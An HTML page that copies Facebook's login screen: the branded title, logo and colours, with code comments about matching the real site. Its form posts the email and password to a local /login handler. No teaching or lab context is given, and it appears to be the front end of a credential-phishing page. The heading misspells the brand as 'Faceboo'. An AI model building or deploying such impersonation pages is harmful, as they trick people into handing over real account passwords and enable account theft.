<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook/login</title>
  <style>
    body {
      background-color: #f0f2f5;
      font-family: Helvetica, Arial, sans-serif;
      margin: 0;
      display: flex;
      flex-direction: column;          /* Changed to column so logo is on top */
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 20px;
    }
    .logo {
      color: #1877f2;
      font-size: 4.5rem;               /* Big logo like real FB */
      font-weight: bold;
      margin-bottom: 40px;             /* Space between logo and card */
      letter-spacing: -2px;
    }
    .login-container {
      width: 100%;
      max-width: 360px;
      background: white;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 0 8px rgba(0, 0, 0, 0.1);
      text-align: center;
    }
    .login-container h1 {
      color: black;
      font-size: 18px;
      margin-bottom: 1rem;
    }
    .login-container input {
      width: 100%;
      padding: 12px;
      margin: 0.5rem 0;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 1rem;
    }
    .login-container button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      font-size: 1.1rem;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 0.5rem;
    }
    .login-container button:hover {
      background-color: #165ecb;
    }
    .login-container a {
      display: block;
      margin-top: 1rem;
      color: #1877f2;
      font-size: 0.9rem;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="logo">facebook</div>
  <div class="login-container">
  <h2>Log Into Faceboo</h2>

  <form method="POST" action="/login">
    <input type="email" name="email" placeholder="Email" required>
    <br><br>
    <input type="password" name="password" placeholder="Password" required>
    <br><br>
    <button type="submit">Login</button>
  </form>

</body>
</html>
